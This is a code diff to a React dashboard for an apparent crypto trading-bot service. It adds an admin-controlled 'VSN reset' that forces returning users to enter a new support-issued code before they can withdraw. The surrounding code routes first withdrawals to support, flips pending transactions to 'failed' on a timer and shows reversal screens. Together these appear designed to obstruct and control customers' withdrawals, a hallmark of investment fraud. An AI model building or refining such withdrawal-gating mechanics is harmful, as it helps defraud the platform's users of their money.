@@ -167,10 +167,19 @@ export default function Dashboard() {
   const [vsnSuccess, setVsnSuccess] = useState(false);
   const [vsnLoading, setVsnLoading] = useState(false);
 
-  /* ── hasWithdrawnBefore (from second code) ── */
+  /* ── hasWithdrawnBefore ── */
   const [hasWithdrawnBefore, setHasWithdrawnBefore] = useState(false);
 
-  /* ── Reversal states (from second code) ── */
+  /*
+   * ── FIX: track whether this user has had their VSN reset by admin ──
+   * When the admin unverifies a user, Firestore sets:
+   *   vsn_required: true, vsn_verified: false, withdrawalStatus: "pending_support"
+   * We need to detect this state and route to the VSN modal, NOT /withdrawal-support.
+   * We use `vsn_required: true && vsn_verified: false` as the signal.
+   */
+  const [isVsnReset, setIsVsnReset] = useState(false);
+
+  /* ── Reversal states ── */
   const [reversalActive, setReversalActive] = useState(false);
   const [reversalAmount, setReversalAmount] = useState(0);
   const [showReversalModal, setShowReversalModal] = useState(false);
@@ -212,11 +221,19 @@ export default function Dashboard() {
           email: userData.email || freshUser.email,
         });
         setProfilePic(profileData.picture || null);
-        setHasWithdrawnBefore(
-          (userData.withdrawalCompletedCount || 0) > 0 ||
-            userData.withdrawalStatus === "successful" ||
-            userData.vsn_verified === true,
+
+        /*
+         * FIX: hasWithdrawnBefore must NOT use vsn_verified as a signal anymore.
+         * After a VSN reset, vsn_verified is false but the user has genuinely
+         * withdrawn before. Use withdrawalCompletedCount > 0 as the reliable check.
+         */
+        setHasWithdrawnBefore((userData.withdrawalCompletedCount || 0) > 0);
+
+        // Detect VSN reset state: admin set vsn_required=true but wiped vsn_verified
+        setIsVsnReset(
+          userData.vsn_required === true && userData.vsn_verified !== true,
         );
+
         clearTimeout(timeout);
       } catch (err) {
         console.error("Profile load error:", err);
@@ -251,25 +268,29 @@ export default function Dashboard() {
       const data = snap.data();
       setBalance(data.balance || 0);
       setBotPhase(computePhase(data));
-      setVsnRequired(data.vsn_required === true && !data.vsn_verified);
 
-      const nowHasWithdrawn =
-        (data.withdrawalCompletedCount || 0) > 0 ||
-        data.withdrawalStatus === "successful" ||
-        data.vsn_verified === true;
-      setHasWithdrawnBefore(nowHasWithdrawn);
+      /*
+       * FIX: vsnRequired is true when admin has set vsn_required=true AND not yet verified.
+       * This covers both first-time VSN and admin-reset VSN.
+       */
+      const vsnActive =
+        data.vsn_required === true && data.vsn_verified !== true;
+      setVsnRequired(vsnActive);
+      setIsVsnReset(vsnActive);
 
-      // Reversal (from second code)
+      /*
+       * FIX: hasWithdrawnBefore is ONLY based on withdrawalCompletedCount.
+       * Do NOT use vsn_verified here — after a reset it's false even for
+       * users who have successfully withdrawn before.
+       */
+      setHasWithdrawnBefore((data.withdrawalCompletedCount || 0) > 0);
+
+      // Reversal
       setReversalActive(data.reversalActive === true);
       setReversalAmount(data.reversalAmount || 0);
 
       setWithdrawStep((prev) => {
-        if (
-          prev === "contact_support" &&
-          data.vsn_required === true &&
-          !data.vsn_verified
-        )
-          return "vsn_pending";
+        if (prev === "contact_support" && vsnActive) return "vsn_pending";
         if (
           data.withdrawalStatus === "successful" &&
           prev !== "reversal" &&
@@ -298,7 +319,7 @@ export default function Dashboard() {
     return () => unsub();
   }, [session?.uid]);
 
-  /* ─── Force re-render every 30s so processing→failed flips (from second code) ─── */
+  /* ─── Force re-render every 30s so processing→failed flips ─── */
   useEffect(() => {
     const id = setInterval(
       () => setUserTransactions((prev) => [...prev]),
@@ -307,7 +328,7 @@ export default function Dashboard() {
     return () => clearInterval(id);
   }, []);
 
-  /* ─── getLiveStatus (from second code) ─── */
+  /* ─── getLiveStatus ─── */
   const getLiveStatus = (t) => {
     if (t.status === "processing") {
       const failsAtMs =
@@ -475,7 +496,7 @@ export default function Dashboard() {
   const handleWithdrawClick = async () => {
     setWithdrawError("");
 
-    // Block if bot is trading or analysing (hourglass shown instead)
+    // Block if bot is trading or analysing
     if (botPhase === "activated" || botPhase === "analysing") return;
 
     const amt = parseFloat(withdrawAmount);
@@ -495,8 +516,32 @@ export default function Dashboard() {
     try {
       const userRef = doc(db, "users", session.uid);
 
-      if (!hasWithdrawnBefore) {
-        // ── FIRST WITHDRAWAL: navigate to contact support then VSN modal (original flow) ──
+      /*
+       * FIX: Three routing cases:
+       *
+       * 1. isVsnReset (admin reset VSN on a returning user) → show VSN modal directly.
+       *    The user has withdrawn before (withdrawalCompletedCount > 0) but the admin
+       *    has revoked their VSN and set vsn_required=true again. We must NOT send
+       *    them to /withdrawal-support. Instead open the VSN modal immediately.
+       *
+       * 2. hasWithdrawnBefore (normal returning user, no reset) → skip straight to
+       *    processing queue.
+       *
+       * 3. First-time withdrawal → send to /withdrawal-support as before.
+       */
+
+      if (isVsnReset) {
+        // Admin reset this user's VSN — save their withdrawal details then show VSN modal
+        await updateDoc(userRef, {
+          pendingWithdrawAmount: amt,
+          pendingWithdrawWallet: withdrawWallet.trim(),
+          pendingWithdrawAt: Timestamp.now(),
+          // Keep withdrawalStatus as pending_support so the admin sees it
+          // vsn_required stays true — the VSN modal submit will clear it
+        });
+        setShowVsnModal(true);
+      } else if (!hasWithdrawnBefore) {
+        // First withdrawal — contact support flow
         await updateDoc(userRef, {
           pendingWithdrawAmount: amt,
           pendingWithdrawWallet: withdrawWallet.trim(),
@@ -508,7 +553,7 @@ export default function Dashboard() {
         });
         navigate("/withdrawal-support");
       } else {
-        // ── SUBSEQUENT WITHDRAWAL: skip straight to "VSN Verified — Queued" screen ──
+        // Returning user, no VSN reset — skip straight to processing
         await updateDoc(userRef, {
           pendingWithdrawAmount: amt,
           pendingWithdrawWallet: withdrawWallet.trim(),
@@ -534,7 +579,7 @@ export default function Dashboard() {
     }
   };
 
-  /* ─── VSN submit (original purple modal flow — first withdrawal) ─── */
+  /* ─── VSN submit ─── */
   const handleVsnSubmit = async () => {
     if (!vsnInput.trim()) {
       setVsnError("Please enter your VSN code.");
@@ -567,6 +612,8 @@ export default function Dashboard() {
       });
       setVsnSuccess(true);
       setVsnInput("");
+      // Reset the VSN reset flag now that it's been successfully verified
+      setIsVsnReset(false);
       setTimeout(() => {
         setShowVsnModal(false);
         setVsnSuccess(false);
@@ -581,7 +628,7 @@ export default function Dashboard() {
     }
   };
 
-  /* ─── HANDLE REVERSAL (from second code) ─── */
+  /* ─── HANDLE REVERSAL ─── */
   const handleReversal = async () => {
     if (!reversalActive || reversalAmount <= 0) return;
     setReversalLoading(true);
@@ -786,7 +833,7 @@ export default function Dashboard() {
         ? ""
         : "-";
 
-  /* ══ HOURGLASS (from second code) — TEAL THEME ══ */
+  /* ══ HOURGLASS ══ */
   const HourglassLocked = () => (
     <div style={{ textAlign: "center", padding: "48px 20px" }}>
       <style>{`
@@ -936,7 +983,7 @@ export default function Dashboard() {
     </div>
   );
 
-  /* ══ WITHDRAWAL PROCESSING SCREEN — "VSN Verified — Queued" (replaces old redirect) ══ */
+  /* ══ WITHDRAWAL PROCESSING SCREEN ══ */
   const WithdrawalProcessingScreen = () => (
     <div style={{ textAlign: "center", padding: "48px 20px" }}>
       <div
@@ -1028,7 +1075,7 @@ export default function Dashboard() {
     </div>
   );
 
-  /* ══ REVERSAL SCREEN (from second code) — AMBER THEME ══ */
+  /* ══ REVERSAL SCREEN ══ */
   const ReversalScreen = () => (
     <div style={{ textAlign: "center", padding: "48px 20px" }}>
       <style>{`
@@ -2342,6 +2389,7 @@ export default function Dashboard() {
                           gap: "16px",
                         }}
                       >
+                        {/* FIX: Show VSN banner for BOTH first-time VSN and admin-reset VSN */}
                         {vsnRequired && (
                           <div
                             style={{
@@ -2381,7 +2429,7 @@ export default function Dashboard() {
                                   margin: "0 0 2px",
                                 }}
                               >
-                                VSN Code Ready
+                                VSN Code Required
                               </p>
                               <p
                                 style={{
@@ -2390,8 +2438,9 @@ export default function Dashboard() {
                                   margin: 0,
                                 }}
                               >
-                                Your VSN code has been issued. Click Withdraw to
-                                enter it.
+                                {isVsnReset
+                                  ? "Your VSN has been reset. A new code has been issued — click below to enter it."
+                                  : "Your VSN code has been issued. Click Withdraw to enter it."}
                               </p>
                             </div>
                           </div>
@@ -3304,7 +3353,7 @@ export default function Dashboard() {
         })}
       </div>
 
-      {/* ══ VSN CODE MODAL — PURPLE THEME (original from first code) ══ */}
+      {/* ══ VSN CODE MODAL ══ */}
       {showVsnModal && (
         <div
           style={{
@@ -3377,8 +3426,9 @@ export default function Dashboard() {
                 margin: "0 0 28px",
               }}
             >
-              Enter the VSN code provided by our support team to complete your
-              withdrawal.
+              {isVsnReset
+                ? "Your VSN has been reset by our team. Enter the new code provided by support to complete your withdrawal."
+                : "Enter the VSN code provided by our support team to complete your withdrawal."}
             </p>
             {vsnSuccess ? (
               <div
@@ -3540,7 +3590,7 @@ export default function Dashboard() {
         </div>
       )}
 
-      {/* ══ REVERSAL CONFIRMATION MODAL (from second code) — AMBER THEME ══ */}
+      {/* ══ REVERSAL CONFIRMATION MODAL ══ */}
       {showReversalModal && (
         <div
           style={{
